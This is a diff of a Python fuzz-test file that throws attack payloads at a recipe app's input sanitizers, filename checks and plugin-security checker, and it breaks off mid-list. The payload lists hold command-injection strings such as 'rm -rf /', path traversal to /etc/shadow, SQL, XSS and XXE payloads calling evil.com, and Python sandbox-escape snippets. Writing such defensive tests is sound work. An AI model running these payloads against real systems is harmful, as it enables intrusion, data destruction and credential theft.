@@ -19,69 +19,51 @@ This is an exhaustive security fuzzer designed to find:
 Run with: pytest tests/test_kitchen_sink_fuzz.py -v --tb=short -x 2>&1 | tee fuzz_results.log
 """
 
-import sys
-import os
 import gc
-import time
+import json
 import random
 import struct
+import sys
 import threading
-import multiprocessing
+import time
 import traceback
-import json
-import pickle
-import base64
-import zlib
-import hashlib
-from pathlib import Path
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
-from typing import Any
+from pathlib import Path
+from typing import Any, Optional
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
-from hypothesis import given, strategies as st, settings, assume, Phase, Verbosity
-from hypothesis import HealthCheck, example, reproduce_failure
-import pytest
+import contextlib
 
-from dinner_app.security import (
-    sanitize_text,
-    validate_recipe_name,
-    validate_ingredient,
-    validate_ingredients_list,
-    validate_directions,
-    validate_category,
-    validate_categories_list,
-    validate_recipe_data,
-    validate_json_recipes,
-    is_safe_filename,
-    check_file_permissions,
-    safe_json_load,
-    safe_json_save,
-    ValidationError,
-    MAX_RECIPE_NAME_LENGTH,
-    MAX_INGREDIENT_LENGTH,
-    MAX_DIRECTION_LENGTH,
-    MAX_INGREDIENTS_PER_RECIPE,
-    MAX_CATEGORIES_PER_RECIPE,
-)
+from hypothesis import HealthCheck, Phase, given, settings
+from hypothesis import strategies as st
+
 from dinner_app.plugin_security import (
     check_plugin_source,
-    validate_plugin_file,
-    compute_plugin_hash,
-    DANGEROUS_IMPORTS,
-    DANGEROUS_CALLS,
+)
+from dinner_app.security import (
+    MAX_CATEGORIES_PER_RECIPE,
+    MAX_DIRECTION_LENGTH,
+    MAX_INGREDIENTS_PER_RECIPE,
+    ValidationError,
+    is_safe_filename,
+    sanitize_text,
+    validate_ingredients_list,
+    validate_recipe_data,
+    validate_recipe_name,
 )
 
 # Logging for vulnerabilities found
 VULN_LOG = Path(__file__).parent / "vulnerabilities_found.log"
 
 
-def log_vulnerability(category: str, description: str, payload: Any, error: Exception = None):
+def log_vulnerability(
+    category: str, description: str, payload: Any, error: Optional[Exception] = None
+):
     """Log a discovered vulnerability."""
     timestamp = datetime.now().isoformat()
     with open(VULN_LOG, "a") as f:
-        f.write(f"\n{'='*80}\n")
+        f.write(f"\n{'=' * 80}\n")
         f.write(f"VULNERABILITY FOUND: {timestamp}\n")
         f.write(f"Category: {category}\n")
         f.write(f"Description: {description}\n")
@@ -89,7 +71,7 @@ def log_vulnerability(category: str, description: str, payload: Any, error: Exce
         if error:
             f.write(f"Error: {type(error).__name__}: {str(error)[:200]}\n")
             f.write(f"Traceback:\n{traceback.format_exc()}\n")
-        f.write(f"{'='*80}\n")
+        f.write(f"{'=' * 80}\n")
 
 
 # Maximum fuzzing settings - 4 hour run
@@ -127,67 +109,125 @@ MEDIUM_SETTINGS = settings(
 # PAYLOAD GENERATORS - The Kitchen Sink
 # =============================================================================
 
+
 class PayloadGenerators:
     """Generate malicious payloads of every type."""
 
     # Integer overflow payloads
     INT_OVERFLOW = [
-        2**31 - 1, 2**31, 2**31 + 1,  # 32-bit boundary
-        2**32 - 1, 2**32, 2**32 + 1,  # unsigned 32-bit
-        2**63 - 1, 2**63, 2**63 + 1,  # 64-bit boundary
-        2**64 - 1, 2**64, 2**64 + 1,  # unsigned 64-bit
-        -2**31, -2**31 - 1,  # negative boundaries
-        -2**63, -2**63 - 1,
-        0, -1, 1,
-        0x7FFFFFFF, 0x80000000, 0xFFFFFFFF,
-        0x7FFFFFFFFFFFFFFF, 0x8000000000000000,
+        2**31 - 1,
+        2**31,
+        2**31 + 1,  # 32-bit boundary
+        2**32 - 1,
+        2**32,
+        2**32 + 1,  # unsigned 32-bit
+        2**63 - 1,
+        2**63,
+        2**63 + 1,  # 64-bit boundary
+        2**64 - 1,
+        2**64,
+        2**64 + 1,  # unsigned 64-bit
+        -(2**31),
+        -(2**31) - 1,  # negative boundaries
+        -(2**63),
+        -(2**63) - 1,
+        0,
+        -1,
+        1,
+        0x7FFFFFFF,
+        0x80000000,
+        0xFFFFFFFF,
+        0x7FFFFFFFFFFFFFFF,
+        0x8000000000000000,
     ]
 
     # Float edge cases
     FLOAT_EDGE = [
-        float('inf'), float('-inf'), float('nan'),
-        0.0, -0.0, 1e308, -1e308, 1e-308, -1e-308,
+        float("inf"),
+        float("-inf"),
+        float("nan"),
+        0.0,
+        -0.0,
+        1e308,
+        -1e308,
+        1e-308,
+        -1e-308,
         2.2250738585072014e-308,  # smallest normalized
         4.9406564584124654e-324,  # smallest subnormal
-        1.7976931348623157e+308,  # largest
-        float.fromhex('0x1.fffffffffffffp+1023'),  # max
-        float.fromhex('0x0.0000000000001p-1022'),  # min subnormal
+        1.7976931348623157e308,  # largest
+        float.fromhex("0x1.fffffffffffffp+1023"),  # max
+        float.fromhex("0x0.0000000000001p-1022"),  # min subnormal
     ]
 
     # Null byte variants
     NULL_BYTES = [
-        "\x00", "\x00\x00", "\x00" * 100,
-        "a\x00b", "\x00abc", "abc\x00",
-        "test\x00evil", "safe\x00<script>",
-        "%00", "%00%00", "test%00evil",
-        "\0", "\\0", "\\x00", "\\u0000",
-        b"\x00".decode('latin-1'),
+        "\x00",
+        "\x00\x00",
+        "\x00" * 100,
+        "a\x00b",
+        "\x00abc",
+        "abc\x00",
+        "test\x00evil",
+        "safe\x00<script>",
+        "%00",
+        "%00%00",
+        "test%00evil",
+        "\0",
+        "\\0",
+        "\\x00",
+        "\\u0000",
+        b"\x00".decode("latin-1"),
     ]
 
     # Path traversal variants (exhaustive)
     PATH_TRAVERSAL = [
         # Unix
-        "../", "../../", "../../../", "../" * 20,
-        "..", "...", "....", "....." + "/" * 10,
-        "./", ".//", "/..", "//../",
-        "....//", "..../", "....\\",
+        "../",
+        "../../",
+        "../../../",
+        "../" * 20,
+        "..",
+        "...",
+        "....",
+        "....." + "/" * 10,
+        "./",
+        ".//",
+        "/..",
+        "//../",
+        "....//",
+        "..../",
+        "....\\",
         # Windows
-        "..\\", "..\\..\\", "..\\..\\..\\",
+        "..\\",
+        "..\\..\\",
+        "..\\..\\..\\",
         "..\\..\\..\\..\\..\\..\\..\\..\\",
         # Encoded
-        "%2e%2e%2f", "%2e%2e/", "..%2f",
-        "%2e%2e%5c", "..%5c", "%2e%2e\\",
-        "%252e%252e%252f", "..%252f",  # double encoded
+        "%2e%2e%2f",
+        "%2e%2e/",
+        "..%2f",
+        "%2e%2e%5c",
+        "..%5c",
+        "%2e%2e\\",
+        "%252e%252e%252f",
+        "..%252f",  # double encoded
         "%c0%ae%c0%ae%c0%af",  # overlong UTF-8
         "%c0%ae%c0%ae/",
-        "..%c0%af", "..%c1%9c",
+        "..%c0%af",
+        "..%c1%9c",
         # Mixed
-        "..././", "...\\.\\", "..\\/..\\",
+        "..././",
+        "...\\.\\",
+        "..\\/..\\",
         "....//....//",
         # Absolute paths
-        "/etc/passwd", "/etc/shadow",
-        "/proc/self/environ", "/proc/self/cmdline",
-        "/dev/null", "/dev/zero", "/dev/random",
+        "/etc/passwd",
+        "/etc/shadow",
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+        "/dev/null",
+        "/dev/zero",
+        "/dev/random",
         "C:\\Windows\\System32\\config\\SAM",
         "\\\\?\\C:\\Windows",
         "file:///etc/passwd",
@@ -196,16 +236,29 @@ class PayloadGenerators:
 
     # Command injection
     COMMAND_INJECTION = [
-        "; ls", "| ls", "& ls", "&& ls",
-        "; cat /etc/passwd", "| cat /etc/passwd",
-        "`id`", "$(id)", "$(`id`)",
-        "; rm -rf /", "| rm -rf /",
-        "\n ls", "\r\n ls",
-        "'; ls #", "\"; ls #",
-        "|| ls", "||| ls",
+        "; ls",
+        "| ls",
+        "& ls",
+        "&& ls",
+        "; cat /etc/passwd",
+        "| cat /etc/passwd",
+        "`id`",
+        "$(id)",
+        "$(`id`)",
+        "; rm -rf /",
+        "| rm -rf /",
+        "\n ls",
+        "\r\n ls",
+        "'; ls #",
+        '"; ls #',
+        "|| ls",
+        "||| ls",
         ";|&`$()'\"\n\r",
-        "${IFS}ls", "$IFS'l''s'",
-        "l]s", "l[s", "l{s}",
+        "${IFS}ls",
+        "$IFS'l''s'",
+        "l]s",
+        "l[s",
+        "l{s}",
     ]
 
     # XSS payloads (exhaustive)
@@ -236,33 +289,38 @@ class PayloadGenerators:
         "<script/src=data:,alert(1)>",
         "'\"--><script>alert(1)</script>",
         "'-alert(1)-'",
-        "\"-alert(1)-\"",
+        '"-alert(1)-"',
         "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
         "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
         "&#60;script&#62;alert(1)&#60;/script&#62;",
         "&lt;script&gt;alert(1)&lt;/script&gt;",
         "\u003cscript\u003ealert(1)\u003c/script\u003e",
-        "<img src=\"x\" onerror=\"alert(1)\">",
-        "<img/src=\"x\"/onerror=\"alert(1)\">",
+        '<img src="x" onerror="alert(1)">',
+        '<img/src="x"/onerror="alert(1)">',
         "<img\nsrc=x\nonerror=alert(1)>",
         "<img\tsrc=x\tonerror=alert(1)>",
     ]
 
     # SQL injection
     SQL_INJECTION = [
-        "' OR '1'='1", "\" OR \"1\"=\"1",
+        "' OR '1'='1",
+        '" OR "1"="1',
         "'; DROP TABLE users; --",
         "'; DELETE FROM recipes; --",
         "1; SELECT * FROM users",
         "1 UNION SELECT * FROM users",
         "' UNION SELECT NULL--",
-        "admin'--", "admin'#",
-        "1' AND '1'='1", "1\" AND \"1\"=\"1",
+        "admin'--",
+        "admin'#",
+        "1' AND '1'='1",
+        '1" AND "1"="1',
         "'; EXEC xp_cmdshell('whoami'); --",
         "'; WAITFOR DELAY '0:0:10'--",
         "1; SHUTDOWN--",
-        "' OR 1=1--", "\" OR 1=1--",
-        "' OR ''='", "\" OR \"\"=\"",
+        "' OR 1=1--",
+        '" OR 1=1--',
+        "' OR ''='",
+        '" OR ""="',
         "'; INSERT INTO users VALUES('hacked')--",
         "1' ORDER BY 1--",
         "1' GROUP BY 1--",
@@ -271,10 +329,17 @@ class PayloadGenerators:
 
     # LDAP injection
     LDAP_INJECTION = [
-        "*", "*)(&", "*)(|", "*()|&'",
-        "admin)(&)", "admin)(|(password=*))",
+        "*",
+        "*)(&",
+        "*)(|",
+        "*()|&'",
+        "admin)(&)",
+        "admin)(|(password=*))",
         "*)(uid=*))(|(uid=*",
-        "\\00", "\\2a", "\\28", "\\29",
+        "\\00",
+        "\\2a",
+        "\\28",
+        "\\29",
     ]
 
     # XML/XXE injection
@@ -282,57 +347,88 @@ class PayloadGenerators:
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
         '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]>',
-        '<![CDATA[<script>alert(1)</script>]]>',
+        "<![CDATA[<script>alert(1)</script>]]>",
         '<?xml version="1.0" encoding="ISO-8859-1"?>',
     ]
 
     # Template injection
     TEMPLATE_INJECTION = [
-        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
         "{{constructor.constructor('return this')()}}",
         "${T(java.lang.Runtime).getRuntime().exec('id')}",
-        "#{7*7}", "@(7*7)", "[[7*7]]",
-        "{{config}}", "{{self}}", "{{request}}",
-        "${env}", "${sys}", "${runtime}",
+        "#{7*7}",
+        "@(7*7)",
+        "[[7*7]]",
+        "{{config}}",
+        "{{self}}",
+        "{{request}}",
+        "${env}",
+        "${sys}",
+        "${runtime}",
         "{{''.__class__.__mro__[2].__subclasses__()}}",
     ]
 
     # Format string
     FORMAT_STRING = [
-        "%s", "%n", "%x", "%p",
+        "%s",
+        "%n",
+        "%x",
+        "%p",
         "%s%s%s%s%s%s%s%s%s%s",
         "%n%n%n%n%n%n%n%n%n%n",
         "%x%x%x%x%x%x%x%x%x%x",
-        "%.999999999s", "%99999999s",
-        "{0}", "{0}{1}{2}{3}{4}",
-        "%(name)s", "%(password)s",
-        "${PATH}", "$HOME", "$USER",
+        "%.999999999s",
+        "%99999999s",
+        "{0}",
+        "{0}{1}{2}{3}{4}",
+        "%(name)s",
+        "%(password)s",
+        "${PATH}",
+        "$HOME",
+        "$USER",
         "AAAA%08x.%08x.%08x.%08x",
     ]
 
     # Unicode attacks
     UNICODE = [
         # RTL/LTR override
-        "\u202e", "\u202d", "\u202c",
-        "\u2066", "\u2067", "\u2068", "\u2069",
-        "\u200e", "\u200f",
+        "\u202e",
+        "\u202d",
+        "\u202c",
+        "\u2066",
+        "\u2067",
+        "\u2068",
+        "\u2069",
+        "\u200e",
+        "\u200f",
         # Zero-width
-        "\u200b", "\u200c", "\u200d",
-        "\ufeff", "\u00ad",
+        "\u200b",
+        "\u200c",
+        "\u200d",
+        "\ufeff",
+        "\u00ad",
         # Homoglyphs
         "аdmin",  # Cyrillic 'а'
         "ѕcript",  # Cyrillic 'ѕ'
         "pаsswоrd",  # Mixed Cyrillic
         # Fullwidth
-        "ｓｃｒｉｐｔ", "ａｄｍｉｎ",
+        "ｓｃｒｉｐｔ",
+        "ａｄｍｉｎ",
         # Mathematical
-        "𝓼𝓬𝓻𝓲𝓹𝓽", "𝕤𝕔𝕣𝕚𝕡𝕥",
+        "𝓼𝓬𝓻𝓲𝓹𝓽",
+        "𝕤𝕔𝕣𝕚𝕡𝕥",
         # Special
-        "ﬁle", "ﬂag",  # ligatures
+        "ﬁle",
+        "ﬂag",  # ligatures
         # Combining chars
-        "e\u0301", "a\u0300", "o\u0302",
+        "e\u0301",
+        "a\u0300",
+        "o\u0302",
         # Overlong UTF-8 (in raw form)
-        "\xc0\xaf", "\xc1\x9c",
+        "\xc0\xaf",
+        "\xc1\x9c",
     ]
 
     # Regex DoS (ReDoS)
@@ -348,19 +444,25 @@ class PayloadGenerators:
 
     # Prototype pollution (for JS-like contexts)
     PROTOTYPE_POLLUTION = [
-        "__proto__", "constructor", "prototype",
-        "__proto__[admin]", "constructor.prototype",
+        "__proto__",
+        "constructor",
+        "prototype",
+        "__proto__[admin]",
+        "constructor.prototype",
         '{"__proto__": {"admin": true}}',
         '{"constructor": {"prototype": {"admin": true}}}',
     ]
 
     # Buffer overflow attempts
     BUFFER_OVERFLOW = [
-        "A" * 256, "A" * 1024, "A" * 4096,
-        "A" * 65536, "A" * (1024 * 1024),
+        "A" * 256,
+        "A" * 1024,
+        "A" * 4096,
+        "A" * 65536,
+        "A" * (1024 * 1024),
         "\x41" * 1000 + "\x42\x42\x42\x42",  # NOP sled + EIP
-        "A" * 100 + struct.pack("<I", 0x41414141).decode('latin-1'),
-        "A" * 100 + struct.pack("<Q", 0x4141414141414141).decode('latin-1'),
+        "A" * 100 + struct.pack("<I", 0x41414141).decode("latin-1"),
+        "A" * 100 + struct.pack("<Q", 0x4141414141414141).decode("latin-1"),
     ]
 
     # Heap spray patterns
@@ -392,7 +494,7 @@ class PayloadGenerators:
     def all_payloads(cls):
         """Generate all payloads."""
         for attr in dir(cls):
-            if attr.isupper() and not attr.startswith('_'):
+            if attr.isupper() and not attr.startswith("_"):
                 value = getattr(cls, attr)
                 if isinstance(value, list):
                     for payload in value:
@@ -402,6 +504,7 @@ class PayloadGenerators:
 # =============================================================================
 # TEXT SANITIZATION - KITCHEN SINK
 # =============================================================================
+
 
 class TestKitchenSinkTextSanitization:
     """Throw everything at text sanitization."""
@@ -413,18 +516,22 @@ class TestKitchenSinkTextSanitization:
             try:
                 if isinstance(payload, (bytes, int, float)):
                     if isinstance(payload, bytes):
-                        payload = payload.decode('latin-1', errors='replace')
+                        payload = payload.decode("latin-1", errors="replace")
                     elif isinstance(payload, (int, float)):
                         payload = str(payload)
                 result = sanitize_text(str(payload), max_length=10000)
                 # Check for dangerous patterns that should be blocked
                 lower_result = result.lower()
-                if any(x in lower_result for x in ['<script', 'javascript:', 'onerror=', 'onload=']):
+                if any(
+                    x in lower_result for x in ["<script", "javascript:", "onerror=", "onload="]
+                ):
                     failures.append((category, payload, "XSS pattern passed through"))
             except ValidationError:
                 pass  # Expected for malicious input
             except Exception as e:
-                log_vulnerability("TEXT_SANITIZATION", f"Unexpected error with {category} payload", payload, e)
+                log_vulnerability(
+                    "TEXT_SANITIZATION", f"Unexpected error with {category} payload", payload, e
+                )
                 failures.append((category, payload, str(e)))
 
         if failures:
@@ -437,9 +544,9 @@ class TestKitchenSinkTextSanitization:
     def test_binary_as_text_massive(self, data):
         """Fuzz with massive binary data decoded as text."""
         try:
-            for encoding in ['utf-8', 'latin-1', 'utf-16', 'utf-32', 'cp1252', 'iso-8859-1']:
+            for encoding in ["utf-8", "latin-1", "utf-16", "utf-32", "cp1252", "iso-8859-1"]:
                 try:
-                    text = data.decode(encoding, errors='replace')
+                    text = data.decode(encoding, errors="replace")
                     result = sanitize_text(text, max_length=50000)
                     assert isinstance(result, str)
                 except (UnicodeDecodeError, ValidationError):
@@ -481,13 +588,14 @@ class TestKitchenSinkTextSanitization:
     def test_all_unicode_categories(self):
         """Test all Unicode categories."""
         import unicodedata
+
         failures = []
 
         # Generate one character from each Unicode category
         for codepoint in range(0x10FFFF):
             try:
                 char = chr(codepoint)
-                cat = unicodedata.category(char)
+                unicodedata.category(char)
                 result = sanitize_text(char * 100, max_length=1000)
                 assert isinstance(result, str)
             except (ValidationError, ValueError):
@@ -497,8 +605,13 @@ class TestKitchenSinkTextSanitization:
                 if len(failures) > 100:
                     break
 
-        for cp, err in failures[:10]:
-            log_vulnerability("UNICODE_CATEGORY", f"Crash on codepoint {cp}", chr(cp) if cp < 0x10000 else f"U+{cp:X}", None)
+        for cp, _err in failures[:10]:
+            log_vulnerability(
+                "UNICODE_CATEGORY",
+                f"Crash on codepoint {cp}",
+                chr(cp) if cp < 0x10000 else f"U+{cp:X}",
+                None,
+            )
 
     @given(st.integers(min_value=0, max_value=0x10FFFF))
     @HEAVY_SETTINGS
@@ -519,6 +632,7 @@ class TestKitchenSinkTextSanitization:
 # FILENAME VALIDATION - KITCHEN SINK
 # =============================================================================
 
+
 class TestKitchenSinkFilename:
     """Throw everything at filename validation."""
 
@@ -537,7 +651,7 @@ class TestKitchenSinkFilename:
         failures = []
         for payload in PayloadGenerators.NULL_BYTES:
             if isinstance(payload, bytes):
-                payload = payload.decode('latin-1')
+                payload = payload.decode("latin-1")
             result = is_safe_filename(payload + ".py")
             if result is True:
                 failures.append(payload)
@@ -570,9 +684,9 @@ class TestKitchenSinkFilename:
     def test_binary_filenames(self, data):
         """Fuzz with binary data as filenames."""
         try:
-            for encoding in ['utf-8', 'latin-1', 'utf-16']:
+            for encoding in ["utf-8", "latin-1", "utf-16"]:
                 try:
-                    filename = data.decode(encoding, errors='replace')
+                    filename = data.decode(encoding, errors="replace")
                     result = is_safe_filename(filename)
                     assert isinstance(result, bool)
                 except UnicodeDecodeError:
@@ -586,6 +700,7 @@ class TestKitchenSinkFilename:
 # PLUGIN SECURITY - KITCHEN SINK
 # =============================================================================
 
+
 class TestKitchenSinkPluginSecurity:
     """Throw everything at plugin security."""
 
@@ -595,55 +710,42 @@ class TestKitchenSinkPluginSecurity:
         "import subprocess; subprocess.call(['whoami'])",
         "from os import system; system('id')",
         "from subprocess import Popen; Popen(['cat', '/etc/passwd'])",
-
         # Obfuscated imports
         "__import__('os').system('id')",
         "getattr(__import__('os'), 'system')('id')",
-        "eval('__import__(\"os\").system(\"id\")')",
+        'eval(\'__import__("os").system("id")\')',
         "exec('import os; os.system(\"id\")')",
         "compile('import os', '', 'exec')",
-
         # Builtins manipulation
         "__builtins__['eval']('1+1')",
         "__builtins__.__dict__['exec']('import os')",
         "globals()['__builtins__']['eval']('1')",
-
         # Class manipulation
         "().__class__.__bases__[0].__subclasses__()",
         "''.__class__.__mro__[1].__subclasses__()",
         "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Popen']",
-
         # Lambda tricks
         "(lambda: __import__('os').system('id'))()",
         "(lambda x=__import__('os'): x.system('id'))()",
-
         # Comprehension tricks
         "[__import__('os').system('id') for _ in [1]]",
         "{__import__('os'): 1}",
-
         # Exception tricks
         "try:\n    raise Exception(__import__('os'))\nexcept Exception as e:\n    e.args[0].system('id')",
-
         # Decorator tricks
         "@(lambda f: __import__('os').system('id'))\ndef foo(): pass",
-
         # Type tricks
         "type('X', (), {'__init__': lambda s: __import__('os')})().system('id')",
-
         # Nested eval
         "eval(eval('chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)'))",
-
         # Pickle exploitation
         "import pickle; pickle.loads(b'exploit')",
-
         # File operations
         "open('/etc/passwd').read()",
         "with open('/etc/shadow') as f: print(f.read())",
-
         # Network operations
         "__import__('socket').socket()",
         "__import__('urllib.request').request.urlopen('http://evil.com')",
-
         # ctypes
         "import ctypes; ctypes.CDLL(None)",
     ]
@@ -663,7 +765,7 @@ class TestKitchenSinkPluginSecurity:
         """Fuzz with massive plugin source."""
         try:
             result = check_plugin_source(source)
-            assert hasattr(result, 'is_safe')
+            assert hasattr(result, "is_safe")
         except Exception as e:
             log_vulnerability("PLUGIN_CRASH", "Crash on plugin source", len(source), e)
             raise
@@ -673,11 +775,11 @@ class TestKitchenSinkPluginSecurity:
     def test_binary_plugin_source(self, data):
         """Fuzz with binary data as plugin source."""
         try:
-            for encoding in ['utf-8', 'latin-1', 'utf-16']:
+            for encoding in ["utf-8", "latin-1", "utf-16"]:
                 try:
-                    source = data.decode(encoding, errors='replace')
+                    source = data.decode(encoding, errors="replace")
                     result = check_plugin_source(source)
-                    assert hasattr(result, 'is_safe')
+                    assert hasattr(result, "is_safe")
                 except UnicodeDecodeError:
                     pass
         except Exception as e:
@@ -689,17 +791,23 @@ class TestKitchenSinkPluginSecurity:
 # RECIPE DATA - KITCHEN SINK
 # =============================================================================
 
+
 class TestKitchenSinkRecipeData:
     """Throw everything at recipe data validation."""
 
-    @given(st.recursive(
-        st.none() | st.booleans() | st.floats(allow_nan=True, allow_infinity=True) |
-        st.integers() | st.text(max_size=1000) | st.binary(max_size=100),
-        lambda children: st.lists(children, max_size=100) | st.dictionaries(
-            st.text(max_size=100), children, max_size=50
-        ),
-        max_leaves=10000
-    ))
+    @given(
+        st.recursive(
+            st.none()
+            | st.booleans()
+            | st.floats(allow_nan=True, allow_infinity=True)
+            | st.integers()
+            | st.text(max_size=1000)
+            | st.binary(max_size=100),
+            lambda children: st.lists(children, max_size=100)
+            | st.dictionaries(st.text(max_size=100), children, max_size=50),
+            max_leaves=10000,
+        )
+    )
     @KITCHEN_SINK_SETTINGS
     def test_arbitrary_data_structures(self, data):
         """Fuzz with arbitrary deeply nested data structures."""
@@ -777,6 +885,7 @@ class TestKitchenSinkRecipeData:
 # CONCURRENCY & RACE CONDITIONS - KITCHEN SINK
 # =============================================================================
 
+
 class TestKitchenSinkConcurrency:
     """Test for race conditions and concurrency issues."""
 
@@ -792,7 +901,9 @@ class TestKitchenSinkConcurrency:
                     # Randomize operations
                     op = random.randint(0, 4)
                     if op == 0:
-                        sanitize_text(f"worker{worker_id}_iter{i}_" + "A" * random.randint(10, 1000))
+                        sanitize_text(
+                            f"worker{worker_id}_iter{i}_" + "A" * random.randint(10, 1000)
+                        )
                     elif op == 1:
                         validate_recipe_name(f"Recipe {worker_id}_{i}")
                     elif op == 2:
@@ -800,7 +911,9 @@ class TestKitchenSinkConcurrency:
                     elif op == 3:
                         check_plugin_source(f"x = {i}")
                     else:
-                        validate_recipe_data({"ingredients": [f"ing{i}"], "directions": "", "categories": []})
+                        validate_recipe_data(
+                            {"ingredients": [f"ing{i}"], "directions": "", "categories": []}
+                        )
                 with lock:
                     results.append(worker_id)
             except Exception as e:
@@ -856,17 +969,19 @@ class TestKitchenSinkConcurrency:
                 try:
                     # Interleave different operations
                     if i % 3 == 0:
-                        result = sanitize_text(f"text_{worker_id}_{i}")
+                        sanitize_text(f"text_{worker_id}_{i}")
                         with lock:
                             shared_state["counter"] += 1
                     elif i % 3 == 1:
-                        result = validate_recipe_data({
-                            "ingredients": [f"ing_{worker_id}_{i}"],
-                            "directions": f"step {i}",
-                            "categories": []
-                        })
+                        validate_recipe_data(
+                            {
+                                "ingredients": [f"ing_{worker_id}_{i}"],
+                                "directions": f"step {i}",
+                                "categories": [],
+                            }
+                        )
                     else:
-                        result = check_plugin_source(f"x = {i}")
+                        check_plugin_source(f"x = {i}")
                 except Exception as e:
                     with lock:
                         shared_state["errors"].append((worker_id, i, e))
@@ -883,6 +998,7 @@ class TestKitchenSinkConcurrency:
 # =============================================================================
 # MEMORY EXHAUSTION & DOS - KITCHEN SINK
 # =============================================================================
+
 
 class TestKitchenSinkMemoryDOS:
     """Test for memory exhaustion and denial of service."""
@@ -908,14 +1024,12 @@ class TestKitchenSinkMemoryDOS:
         """Test ReDoS patterns."""
         for pattern in PayloadGenerators.REDOS:
             start = time.time()
-            try:
-                result = sanitize_text(pattern)
-            except ValidationError:
-                pass
+            with contextlib.suppress(ValidationError):
+                sanitize_text(pattern)
             elapsed = time.time() - start
             if elapsed > 5.0:
                 log_vulnerability("REDOS", f"ReDoS: {elapsed}s for pattern", pattern[:50], None)
-                assert False, f"ReDoS detected: {elapsed}s"
+                raise AssertionError(f"ReDoS detected: {elapsed}s")
 
     def test_deeply_nested_regex_patterns(self):
         """Test deeply nested patterns that could cause backtracking."""
@@ -927,10 +1041,8 @@ class TestKitchenSinkMemoryDOS:
         ]
         for pattern in patterns:
             start = time.time()
-            try:
-                result = sanitize_text(pattern)
-            except ValidationError:
-                pass
+            with contextlib.suppress(ValidationError):
+                sanitize_text(pattern)
             elapsed = time.time() - start
             assert elapsed < 5.0, f"Nested pattern took {elapsed}s"
 
@@ -938,6 +1050,7 @@ class TestKitchenSinkMemoryDOS:
 # =============================================================================
 # INTEGER & NUMERIC EDGE CASES - KITCHEN SINK
 # =============================================================================
+
 
 class TestKitchenSinkNumeric:
     """Test all numeric edge cases."""
@@ -963,11 +1076,11 @@ class TestKitchenSinkNumeric:
         """Fuzz with arbitrary floats."""
         try:
             data = {"ingredients": [], "directions": "", "categories": [], "cook_time": num}
-            result = validate_recipe_data(data)
+            validate_recipe_data(data)
         except (ValidationError, OverflowError, ValueError):
             pass
         except Exception as e:
-            log_vulnerability("FLOAT", f"Crash on float", num, e)
+            log_vulnerability("FLOAT", "Crash on float", num, e)
             raise
 
     @given(st.complex_numbers())
@@ -976,19 +1089,24 @@ class TestKitchenSinkNumeric:
         """Try complex numbers (should be handled gracefully)."""
         try:
             data = {"ingredients": [], "directions": "", "categories": [], "cook_time": num}
-            result = validate_recipe_data(data)
+            validate_recipe_data(data)
         except (ValidationError, TypeError, ValueError):
             pass
         except Exception as e:
-            log_vulnerability("COMPLEX", f"Crash on complex", num, e)
+            log_vulnerability("COMPLEX", "Crash on complex", num, e)
             raise
 
     def test_special_numeric_strings(self):
         """Test special numeric strings."""
         special = [
-            "NaN", "Infinity", "-Infinity",
-            "1e999", "-1e999", "1e-999",
-            "0x7FFFFFFF", "0xFFFFFFFF",
+            "NaN",
+            "Infinity",
+            "-Infinity",
+            "1e999",
+            "-1e999",
+            "1e-999",
+            "0x7FFFFFFF",
+            "0xFFFFFFFF",
             "9" * 1000,  # Very long number
             "-" + "9" * 1000,
             "1.1" + "1" * 1000,
@@ -1005,15 +1123,23 @@ class TestKitchenSinkNumeric:
 # TYPE CONFUSION - KITCHEN SINK
 # =============================================================================
 
+
 class TestKitchenSinkTypeConfusion:
     """Test type confusion vulnerabilities."""
 
     def test_type_juggling(self):
         """Test type juggling attacks."""
         juggles = [
-            (0, "0"), ("0", 0), (False, 0), (None, ""),
-            ([], ""), ({}, ""), (set(), ""),
-            (0.0, False), ("false", False), ("true", True),
+            (0, "0"),
+            ("0", 0),
+            (False, 0),
+            (None, ""),
+            ([], ""),
+            ({}, ""),
+            (set(), ""),
+            (0.0, False),
+            ("false", False),
+            ("true", True),
             (b"test", "test"),
             (bytearray(b"test"), "test"),
             (memoryview(b"test"), "test"),
@@ -1030,7 +1156,7 @@ class TestKitchenSinkTypeConfusion:
             except (ValidationError, TypeError):
                 pass
             except Exception as e:
-                log_vulnerability("TYPE_JUGGLE", f"Crash on type juggle", (a, b), e)
+                log_vulnerability("TYPE_JUGGLE", "Crash on type juggle", (a, b), e)
 
     @given(st.from_type(type).flatmap(st.from_type))
     @MEDIUM_SETTINGS
@@ -1046,24 +1172,41 @@ class TestKitchenSinkTypeConfusion:
         except (ValidationError, TypeError, AttributeError):
             pass
         except Exception as e:
-            log_vulnerability("RANDOM_TYPE", f"Crash on random type", type(value).__name__, e)
+            log_vulnerability("RANDOM_TYPE", "Crash on random type", type(value).__name__, e)
 
 
 # =============================================================================
 # ENCODING ATTACKS - KITCHEN SINK
 # =============================================================================
 
+
 class TestKitchenSinkEncoding:
     """Test all encoding-based attacks."""
 
     ENCODINGS = [
-        'utf-8', 'utf-16', 'utf-16-le', 'utf-16-be',
-        'utf-32', 'utf-32-le', 'utf-32-be',
-        'latin-1', 'iso-8859-1', 'iso-8859-15',
-        'cp1252', 'cp437', 'cp850',
-        'ascii', 'big5', 'gb2312', 'gbk', 'gb18030',
-        'euc-jp', 'euc-kr', 'shift_jis',
-        'koi8-r', 'koi8-u',
+        "utf-8",
+        "utf-16",
+        "utf-16-le",
+        "utf-16-be",
+        "utf-32",
+        "utf-32-le",
+        "utf-32-be",
+        "latin-1",
+        "iso-8859-1",
+        "iso-8859-15",
+        "cp1252",
+        "cp437",
+        "cp850",
+        "ascii",
+        "big5",
+        "gb2312",
+        "gbk",
+        "gb18030",
+        "euc-jp",
+        "euc-kr",
+        "shift_jis",
+        "koi8-r",
